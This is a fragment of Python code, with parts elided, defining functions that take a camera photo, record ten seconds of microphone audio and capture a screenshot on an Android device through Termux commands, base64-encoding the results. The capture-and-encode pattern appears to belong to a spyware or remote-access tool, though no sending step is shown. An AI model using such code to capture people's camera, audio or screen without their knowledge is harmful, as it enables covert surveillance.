...
def foto(cam=0):
    ...
    try:
        subprocess.call(f"termux-camera-photo -c {cam} {path}", shell=True, timeout=20)
        time.sleep(2)
...
def audio():
    ...
    try:
        subprocess.call(f"termux-microphone-record -f {path} -l 10", shell=True, timeout=20)
        time.sleep(12)
        if os.path.exists(path) and os.path.getsize(path) > 100:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
...
def screenshot():
    ...
    try:
        subprocess.call(f"screencap {path}", shell=True, timeout=20)
        time.sleep(2)
        if os.path.exists(path) and os.path.getsize(path) > 100:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
